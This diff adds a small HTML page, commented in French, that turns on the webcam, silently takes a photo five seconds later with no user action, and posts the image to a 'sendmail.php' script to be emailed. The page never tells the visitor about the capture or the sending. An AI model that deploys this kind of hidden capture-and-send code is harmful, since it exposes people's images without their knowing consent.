@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capture photo</title>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        // Accéder à la caméra
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                console.log("Erreur d'accès à la caméra:", error);
+            });
+
+        // Capturer la photo automatiquement
+        setTimeout(function() {
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+
+            // Envoyer la photo par e-mail
+            var dataUrl = canvas.toDataURL('image/jpeg');
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'sendmail.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('image=' + dataUrl);
+        }, 5000); // Attendre 5 secondes avant de capturer la photo
+    </script>
+</body>
+</html>
